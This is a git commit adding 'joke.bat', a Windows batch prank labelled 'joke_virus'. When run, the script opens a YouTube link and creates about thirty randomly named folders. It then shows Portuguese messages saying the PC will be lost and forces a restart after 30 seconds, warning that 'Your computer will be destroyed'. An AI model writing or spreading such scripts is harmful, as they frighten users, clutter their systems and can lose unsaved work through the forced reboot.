2eadd5cba47d87443658604a5298178263107b44
WilliamBraz2004 <willbrancocamposbraz@gmail.com>
2021-10-27 10:07:19 -0300

    joke_virus

---
+++ joke.bat
@@ -0,0 +1,39 @@
+@echo off
+start www.youtube.com/watch?v=u9WsZoceais
+
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+
+msg * Ola amigo =)
+msg * Voce nao deveria ter aberto este arquivo.
+msg * Diga adeus ao seu PC.
+
+shutdown -r -t 30 -c "Seu computador sera destruido"
